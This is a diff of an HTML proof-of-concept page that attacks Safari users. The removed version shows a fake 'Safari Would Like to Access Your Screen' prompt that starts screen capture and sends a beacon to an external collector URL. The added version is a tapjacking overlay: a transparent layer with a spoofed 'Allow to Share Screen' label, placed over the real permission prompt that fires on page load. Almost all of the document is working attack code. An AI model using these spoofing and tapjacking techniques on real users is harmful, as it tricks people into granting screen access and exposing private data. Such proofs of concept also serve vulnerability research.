@@ -1,100 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>Safari Screen Access</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Safari Tapjacking PoC</title>
   <style>
     html, body {
       margin: 0;
       background: #f9f9f9;
       font-family: -apple-system, sans-serif;
     }
-
-    #fakePrompt {
+    #tapOverlay {
       position: fixed;
-      top: 20vh;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 90%;
-      max-width: 400px;
-      background: white;
-      border-radius: 14px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.15);
-      padding: 24px;
-      text-align: center;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(0,0,0,0.0); /* transparan tapi pointer-events aktif */
       z-index: 9999;
     }
-
-    #fakePrompt h2 {
-      font-size: 18px;
-      margin-bottom: 10px;
-    }
-
-    #fakePrompt p {
-      font-size: 14px;
-      color: #444;
-      margin-bottom: 20px;
-    }
-
-    #confirmBtn {
-      background: #007AFF;
+    #spoofButton {
+      background: #2c2c2e;
       color: white;
       border: none;
       border-radius: 10px;
-      padding: 12px 24px;
+      padding: 16px 20px;
       font-size: 16px;
-      width: 100%;
-    }
-
-    video {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      z-index: 1;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.4);
+      width: 300px;
+      pointer-events: none; /* allow click-through to real Safari button */
     }
   </style>
 </head>
 <body>
 
-<div id="fakePrompt">
-  <h2>“Safari” Would Like to Access Your Screen</h2>
-  <p>This access is required to continue.</p>
-  <button id="confirmBtn">Allow</button>
+<!-- Tap-through overlay spoof -->
+<div id="tapOverlay">
+  <div id="spoofButton">Allow to Share Screen</div>
 </div>
 
 <script>
-  function requestScreen() {
-    navigator.mediaDevices.getDisplayMedia({ video: true })
-      .then(stream => {
-        const vid = document.createElement("video");
-        vid.srcObject = stream;
-        vid.autoplay = true;
-        document.body.appendChild(vid);
-
-        document.getElementById('fakePrompt').remove();
-
-        // Optional: exfiltrate using beacon
-        stream.getVideoTracks()[0].addEventListener('ended', () => {
-          navigator.sendBeacon("https://xss.report/c/waduh", "Screen sharing ended.");
-        });
-      })
-      .catch(err => {
-        console.error("Access denied or failed:", err);
-      });
-  }
-
-  // Trigger after Reading List load (no gesture needed)
-  window.onload = () => {
-    // Show prompt immediately
-    document.getElementById("confirmBtn").onclick = () => {
-      requestScreen();
-    };
-
-    // Auto-scroll prevention / viewport enforcement
-    window.scrollTo(0, 0);
+  // Request real prompt AFTER DOM loads from Reading List
+  window.onload = async () => {
+    try {
+      await navigator.mediaDevices.getDisplayMedia({ video: true });
+    } catch(e) {
+      console.error("Permission denied or blocked:", e);
+    }
   };
 </script>
 
